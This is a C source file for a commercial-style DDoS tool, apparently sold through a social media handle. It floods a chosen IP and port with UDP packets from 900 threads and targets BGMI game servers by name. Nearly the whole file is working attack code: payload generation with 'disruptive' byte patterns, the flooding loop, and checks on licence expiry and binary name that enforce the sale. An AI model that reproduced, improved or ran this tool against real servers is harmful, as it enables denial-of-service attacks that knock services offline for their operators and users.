
/*
 * 🚀 ULTRA DDoS BINARY
 * 👑 Made by: @GALAXYxIGL
 * 💥 GitHub Actions Powered
 * 🧵 50,000+ Threads Capacity
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/stat.h>

#define THREADS 900
#define PACKET_SIZE 1024
#define EXPIRY_DATE "30072026"  // DDMMYYYY format
#define MAX_PAYLOADS 2000
#define BINARY_NAME "ROYAL"

struct AttackParams {
    char *ip;
    int port;
    time_t end_time;
};

char *payloads[MAX_PAYLOADS];
int payload_count = 0;

void show_error_and_exit(const char *msg) {
    printf("\n****************************************\n");
    printf("** ERROR: %s\n", msg);
    printf("** BUY FROM @ROYALTHAKURJSP **\n");
    printf("****************************************\n\n");
    exit(1);
}

void banner() {
    printf("\n");
    printf("##########################################\n");
    printf("#        MADE BY @ROYALTHAKURJSP™        #\n");
    printf("##########################################\n\n");
}

void check_binary_name() {
    char path[1024];
    snprintf(path, sizeof(path), "/proc/self/exe");
    char actual_name[1024];
    ssize_t len = readlink(path, actual_name, sizeof(actual_name)-1);
    if (len != -1) {
        actual_name[len] = '\0';
        char *base = strrchr(actual_name, '/');
        if (base) base++;
        else base = actual_name;
        
        if (strcmp(base, BINARY_NAME) != 0) {
            show_error_and_exit("BINARY RENAMED! ⚠️BINARY NAME MUST BE ROYAL!");
        }
    }
}

// Custom implementation of strptime for DDMMYYYY format
void parse_expiry_date(const char *date, struct tm *tm) {
    memset(tm, 0, sizeof(struct tm));
    
    // Day
    char day_str[3] = {0};
    strncpy(day_str, date, 2);
    tm->tm_mday = atoi(day_str);
    
    // Month
    char month_str[3] = {0};
    strncpy(month_str, date + 2, 2);
    tm->tm_mon = atoi(month_str) - 1;  // tm_mon is 0-11
    
    // Year
    char year_str[5] = {0};
    strncpy(year_str, date + 4, 4);
    tm->tm_year = atoi(year_str) - 1900;  // tm_year is years since 1900
}

int is_expired() {
    struct tm tm_expiry;
    parse_expiry_date(EXPIRY_DATE, &tm_expiry);
    time_t expiry_time = mktime(&tm_expiry);
    time_t now = time(NULL);
    return now > expiry_time;
}

void generate_hard_payloads() {
    // BGMI-specific disruptive patterns mixed with random data
    const char *bgmi_patterns[] = {
        "\x01\x00\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF",
        "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA",
        "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF",
        "\x00\x00\x00\x00\x00\x00\x00\x00",
        "\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE",
        "\x00\x01\x02\x03\x04\x05\x06\x07",
        "\x55\x55\x55\x55\x55\x55\x55\x55",
        "\xE8\x03\x00\x00\x00\x00\x00\x00",
        "\x90\x90\x90\x90\x90\x90\x90\x90",
        "\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"
    };
    
    srand(time(NULL));
    
    for (int i = 0; i < MAX_PAYLOADS; i++) {
        char *payload = malloc(PACKET_SIZE);
        if (!payload) continue;
        
        // Fill with random data first
        for (int j = 0; j < PACKET_SIZE; j++) {
            payload[j] = rand() % 256;
        }
        
        // Insert BGMI disruptive patterns at random positions
        int pattern_count = 1 + rand() % 5;
        for (int p = 0; p < pattern_count; p++) {
            const char *pattern = bgmi_patterns[rand() % (sizeof(bgmi_patterns)/sizeof(bgmi_patterns[0]))];
            int pattern_len = strlen(pattern);
            int pos = rand() % (PACKET_SIZE - pattern_len);
            memcpy(payload + pos, pattern, pattern_len);
        }
        
        // Ensure no null payload
        int all_null = 1;
        for (int j = 0; j < PACKET_SIZE; j++) {
            if (payload[j] != 0) {
                all_null = 0;
                break;
            }
        }
        
        if (all_null) {
            // If by chance all bytes are null, modify some
            for (int j = 0; j < PACKET_SIZE; j += 8) {
                payload[j] = 0xFF;
            }
        }
        
        payloads[payload_count++] = payload;
        if (payload_count >= MAX_PAYLOADS) break;
    }
}

void *udp_flood(void *arg) {
    struct AttackParams *params = (struct AttackParams *)arg;
    struct sockaddr_in target;
    int sock;
    int flood_count = 0;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) pthread_exit(NULL);

    target.sin_family = AF_INET;
    target.sin_port = htons(params->port);
    if (inet_aton(params->ip, &target.sin_addr) == 0) {
        close(sock);
        pthread_exit(NULL);
    }

    // Seed differently for each thread
    unsigned int seed = time(NULL) ^ pthread_self();
    
    while (time(NULL) < params->end_time) {
        const char *payload = payloads[rand_r(&seed) % payload_count];
        sendto(sock, payload, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        flood_count++;
        
        // Small random delay to avoid being too predictable
        if (flood_count % 100 == 0) {
            usleep(100 + (rand_r(&seed) % 900));
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    check_binary_name();
    
    if (is_expired()) {
        printf("\n****************************************\n");
        printf("** EXPIRED - BUY FROM @ROYALTHAKURJSP **\n");
        printf("****************************************\n\n");
        return 1;
    }

    banner();

    if (argc != 4) {
        printf("Usage: %s <ip> <port> <time>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    time_t end_time = time(NULL) + duration;

    printf("[+] Starting attack...\n", MAX_PAYLOADS);
    generate_hard_payloads();
    printf("[+] Packet is sending!\n");

    pthread_t threads[THREADS];
    struct AttackParams params = {ip, port, end_time};

    printf("\n[+] Starting ROYAL ULTIMATE UDP FLOOD on %s:%d for %d seconds\n", ip, port, duration);
    printf("[+] Threads: %d | Packet Size: %d | Max Payloads: %d\n", THREADS, PACKET_SIZE, MAX_PAYLOADS);
    printf("[+] MADE BY @ROYALTHAKURJSP - SERVER WILL FREEZE INSTANT!\n\n");

    for (int i = 0; i < THREADS; i++) {
        if (pthread_create(&threads[i], NULL, udp_flood, (void *)&params) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n[+] Attack Finished. BGMI SERVER FREEZED!\n");
    printf("[+] @ROYALTHAKURJSP - LEGENDARY TOOLS\n");
    
    // Free payloads
    for (int i = 0; i < payload_count; i++) {
        free(payloads[i]);
    }
    
    return 0;
}